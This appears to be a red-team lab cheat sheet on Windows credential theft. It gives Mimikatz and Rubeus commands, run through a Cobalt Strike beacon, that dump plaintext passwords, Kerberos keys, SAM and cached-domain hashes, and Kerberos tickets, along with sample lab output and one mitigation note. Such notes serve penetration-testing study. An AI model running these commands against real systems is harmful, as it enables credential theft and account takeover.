# Credentials Theft

* [Dump credential with Mimikatz](#Dump-credential-with-Mimikatz)
  * [Logon Password] 
  * [Kerberos encryption keys]
  * [Security Account Management]
  * [Domain Cached Credentials]
* [Extracting Kerberos Ticket](#Extracting-Kerberos-Ticket)

## Dump credential with Mimikatz
### Logon Password
Dump plaintext passwords from memory :
```
beacon> mimikatz sekurlsa::logonpasswords
Or
beacon> logonpasswords
```


Windows mitigation disable WDigest by default 
```
HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```
* If the UseLogonCredential value is set to 0, WDigest will not store credentials in memory.
* If the UseLogonCredential value is set to 1, WDigest will store credentials in memory.

### Kerberos encryption keys
This mimikatz module will dump Kerberos encryption keys. This command requires elevated privileges (by previously running Mimikatz as the NT-AUTHORITY\SYSTEM account).
```
beacon> mimikatz sekurlsa::ekeys

Authentication Id : 0 ; 697146 (00000000:000aa33a)
Session           : Service from 0
User Name         : MediaAdmin$
Domain            : hacklab
Logon Server      : DC
Logon Time        : 10/17/2021 4:22:01 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1427

         * Username : MediaAdmin$
         * Domain   : HACKLAB.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       d615e9a2f1e538d23478b03efb5ef470b16f352bbd9afa6f28408d1ff893c1c7
           rc4_hmac_nt       35950fdc8d3d99b4136510414009662d
           rc4_hmac_old      35950fdc8d3d99b4136510414009662d
           rc4_md4           35950fdc8d3d99b4136510414009662d
           rc4_hmac_nt_exp   35950fdc8d3d99b4136510414009662d
           rc4_hmac_old_exp  35950fdc8d3d99b4136510414009662d
```
### Security Account Management
Security Account Management database holds the NTLM hashes of local accounts only. 
```
beacon> mimikatz lsadump::sam

Domain : DC
SysKey : 7852ea75b3b8c4093fbda3f618a045bb
Local SID : S-1-5-21-97532702-2134717100-614679475

SAMKey : 7a87c9ff42815d7d1cead9fe84db22ba

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 4d01f91984530f183381bdf5f0605f63

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```
### Domain Cached Credentials
The local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked 
offline to recover plaintext credentials.

```
beacon> mimikatz lsadump::cache

Domain : WIN10
SysKey : 7e6804db6db0bbc15372ddf840962151

Local name : WIN10 ( S-1-5-21-1604892360-3618202543-1602915806 )
Domain name : hacklab ( S-1-5-21-2725560159-1428537199-2260736313 )
Domain FQDN : hacklab.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {9b57ea93-9de6-5d50-0497-034513ddc692}
  [00] {9b57ea93-9de6-5d50-0497-034513ddc692} 62dd3714cc6d8e08f2c90bb18d949eb4e7fddb2478342640c5dc78a68d165e05

* Iteration is set to default (10240)

[NL$1 - 10/30/2021 8:53:10 PM]
RID       : 000006c2 (1730)
User      : hacklab\m3g9tr0n
MsCacheV2 : 7d3fb233bff87d75413d2c813df73fec

[NL$2 - 9/26/2021 2:46:02 PM]
RID       : 000001f4 (500)
User      : hacklab\Administrator
MsCacheV2 : fadb59e7f2f9a9bf6557ad4fa09e828f

[NL$3 - 10/18/2021 3:56:38 PM]
RID       : 000006c4 (1732)
User      : hacklab\optimus
MsCacheV2 : 98982877b0b57416d47a9a8f21331536

```
### Extracting Kerberos Ticket
Instead of using NTLM hashes or AES keys to request a TGT for the user, we can extract their TGT directly from memory.

Rebeus triage will list the kerberos ticket in all the logon session currently on a system
```
beacon> execute-assembly Rubeus.exe triage
-------------------------------------------------------------------
LUID    | Username              | Service             | EndTime    |
-------------------------------------------------------------------
0x462eb | bfarmer@ DEV.Cyber.io | krbtgt/DEV.Cyber.io |            |
-------------------------------------------------------------------
```
User bfarmer has logon session with LUID 0x462eb and krbtgt service mean this TGT. To extract it use rebeus dump
```
beacon> execute-assembly Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap 
```

https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/ekeys

https://tools.thehacker.recipes/mimikatz/modules/lsadump/sam

https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
